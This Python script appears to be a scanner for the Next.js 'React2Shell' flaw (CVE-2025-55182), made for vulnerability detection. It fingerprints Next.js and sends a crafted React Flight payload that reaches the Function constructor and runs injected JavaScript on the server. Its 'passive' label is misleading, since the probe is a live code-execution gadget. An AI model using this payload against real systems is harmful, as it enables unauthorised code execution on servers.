#!/usr/bin/env python3
# krakhen.dev
# version 2.0.0

"""
Next.js React2Shell Passive Detector
CVE-2025-55182 style — Non-exploit scanner
Author  : krakhen.dev
Company : vCISO
Github  : https://github.com/nehkark/CVE-2025-55182

Description:
    Fingerprints Next.js + React Server Components and sends a benign
    React Flight payload that triggers a NEXT_REDIRECT with a fixed
    marker digest (REACT2SHELL_PROBE). No OS commands are executed.
    If the server executes the gadget and returns the marker in a 5xx
    error, the target is likely vulnerable to React2Shell-style exploit.
"""

import argparse
import json
import ssl
from datetime import datetime, timezone

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

# Disable noisy SSL warnings for controlled scans
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI colors
RESET   = "\033[0m"
RED     = "\033[31m"
GREEN   = "\033[32m"
YELLOW  = "\033[33m"
CYAN    = "\033[36m"

MARKER = "REACT2SHELL_PROBE"


class TLSHostnameIgnoreAdapter(HTTPAdapter):
    """
    HTTPS adapter that:
      - keeps TLS negotiation
      - ignores hostname mismatch (CN vs IP)
      - still validates certificates when verify=True
    Useful when scanning HTTPS services by IP.
    """
    def init_poolmanager(self, *args, **kwargs):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_REQUIRED
        kwargs["ssl_context"] = ctx
        return super().init_poolmanager(*args, **kwargs)


def make_session(verify_tls: bool) -> requests.Session:
    """Create a requests Session with optional TLS hostname ignore."""
    s = requests.Session()
    if verify_tls:
        s.mount("https://", TLSHostnameIgnoreAdapter())
    return s


def summarize_body(body: str, limit: int = 200) -> str:
    body = body.replace("\n", " ")
    return body if len(body) <= limit else body[:limit] + "..."


def extract_digest(body: str):
    """Extract the `digest` field from a NEXT_REDIRECT-like JSON error."""
    key = '"digest":"'
    idx = body.find(key)
    if idx == -1:
        return None
    start = idx + len(key)
    end = body.find('"', start)
    if end == -1:
        return None
    return body[start:end]


def build_probe_payload() -> dict:
    """
    Build a benign React Flight payload that:
      - does NOT execute OS commands
      - only throws NEXT_REDIRECT with a fixed digest marker.
    If this gadget runs, we know the dangerous code path is reachable.
    """
    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            "_prefix": (
                "throw Object.assign(new Error('NEXT_REDIRECT'), "
                "{digest:`" + MARKER + "`});"
            ),
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }

    files = {
        "0": (None, json.dumps(crafted_chunk)),
        "1": (None, '"$@0"'),
    }
    return files


def fingerprint_nextjs(url: str, timeout: int, verify_tls: bool):
    """Basic Next.js + RSC fingerprint using a GET to the base URL."""
    s = make_session(verify_tls)
    try:
        r = s.get(url, timeout=timeout, verify=verify_tls)
    except Exception as e:
        return None, [f"Connection failed: {e}"]

    findings = []
    likely_next = False
    rsc_detected = False
    inferred_gen = "Unknown"

    server_header = (r.headers.get("server") or "").lower()
    powered = (r.headers.get("x-powered-by") or "").lower()
    vary = (r.headers.get("vary") or "").lower()
    x_cache = r.headers.get("x-nextjs-cache")

    if "next" in server_header or "next" in powered:
        findings.append("Next.js detected via headers.")
        likely_next = True

    if "__NEXT_DATA__" in r.text:
        findings.append("Next.js runtime markers found in HTML body.")
        likely_next = True

    if "rsc" in vary or "next-router-state-tree" in vary:
        findings.append("React Server Components (RSC) detected.")
        rsc_detected = True

    if rsc_detected and x_cache:
        inferred_gen = "Next.js 14.2+ or 15.x (RSC enabled)"
    elif x_cache:
        inferred_gen = "Next.js 13+ (App Router likely enabled)"
    elif likely_next:
        inferred_gen = "Next.js (generation unclear)"

    findings.append(f"Inferred Next.js generation: {inferred_gen}")

    return {
        "response": r,
        "likely_next": likely_next,
        "rsc_detected": rsc_detected,
        "inferred_generation": inferred_gen,
    }, findings


def probe_react2shell(url: str, timeout: int, verify_tls: bool):
    """
    Send benign React Flight probe and look for:
      - HTTP 5xx (typically 500)
      - digest == MARKER inside the error body.
    If both match, the target is likely vulnerable to React2Shell.
    """
    s = make_session(verify_tls)
    files = build_probe_payload()
    headers = {"Next-Action": "x"}

    try:
        res = s.post(url, files=files, headers=headers, timeout=timeout, verify=verify_tls)
    except Exception as e:
        return None, [f"Probe request failed: {e}"]

    findings = []
    digest = extract_digest(res.text)

    if 500 <= res.status_code < 600 and digest == MARKER:
        findings.append("Benign React Flight gadget executed and returned marker digest.")
        findings.append("This strongly suggests React2Shell / CVE-2025-55182 style vulnerability.")
        vulnerable = True
    elif digest == MARKER:
        findings.append(
            f"Marker digest found but unexpected status code: {res.status_code}."
        )
        vulnerable = True
    else:
        findings.append(
            f"No marker digest in response. Status: {res.status_code}."
        )
        vulnerable = False

    return {
        "response": res,
        "vulnerable": vulnerable,
        "digest": digest,
    }, findings


def parse_args():
    parser = argparse.ArgumentParser(
        description="Passive React2Shell detector for Next.js (CVE-2025-55182-style, no OS commands)."
    )
    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target base URL (e.g. http://host:3000 or https://host)"
    )
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=10,
        help="HTTP timeout in seconds (default: 10)"
    )
    parser.add_argument(
        "-k", "--insecure",
        action="store_true",
        help="Disable TLS verification (useful for HTTPS by IP in labs)."
    )
    return parser.parse_args()


def main():
    args = parse_args()
    base_url = args.url.strip()
    verify_tls = not args.insecure

    print(f"{CYAN}Next.js React2Shell Passive Detector{RESET}")
    print(f"{CYAN}------------------------------------{RESET}\n")
    print(f"{CYAN}[+] Target URL :{RESET} {base_url}")
    print(f"{CYAN}[+] Timeout    :{RESET} {args.timeout}s")
    print(f"{CYAN}[+] TLS verify :{RESET} {'enabled' if verify_tls else 'DISABLED'}\n")

    ts = datetime.now(timezone.utc).isoformat()

    fp, fp_findings = fingerprint_nextjs(base_url, args.timeout, verify_tls)
    if fp is None:
        print(f"{RED}[X] Fingerprint failed:{RESET} {fp_findings[0]}")
        return

    print(f"{YELLOW}=== Fingerprint ==={RESET}")
    for f in fp_findings:
        if "detected" in f.lower():
            print(f"  {GREEN}- {f}{RESET}")
        else:
            print(f"  {YELLOW}- {f}{RESET}")
    print("")

    probe, probe_findings = probe_react2shell(base_url, args.timeout, verify_tls)
    if probe is None:
        print(f"{RED}[X] Probe failed:{RESET} {probe_findings[0]}")
        return

    print(f"{YELLOW}=== React2Shell Probe ==={RESET}")
    for f in probe_findings:
        if "vulnerability" in f.lower() or "gadget executed" in f.lower():
            print(f"  {RED}- {f}{RESET}")
        else:
            print(f"  {YELLOW}- {f}{RESET}")
    print("")

    if probe["vulnerable"]:
        verdict = f"{RED}LIKELY_VULNERABLE to React2Shell-style exploit path{RESET}"
    else:
        verdict = f"{GREEN}No conclusive evidence of React2Shell exploitability{RESET}"

    status = probe["response"].status_code if probe["response"] is not None else "N/A"
    body_snippet = summarize_body(
        probe["response"].text if probe["response"] is not None else "", 200
    )

    print(f"{CYAN}=== Summary ==={RESET}")
    print(f"Timestamp (UTC): {ts}")
    print(f"Target         : {base_url}")
    print(f"HTTP status    : {status}")
    print(f"Digest         : {probe['digest'] or 'None'}")
    print(f"Verdict        : {verdict}\n")
    print(f"{YELLOW}Response body (truncated):{RESET}")
    print(body_snippet)


if __name__ == "__main__":
    main()
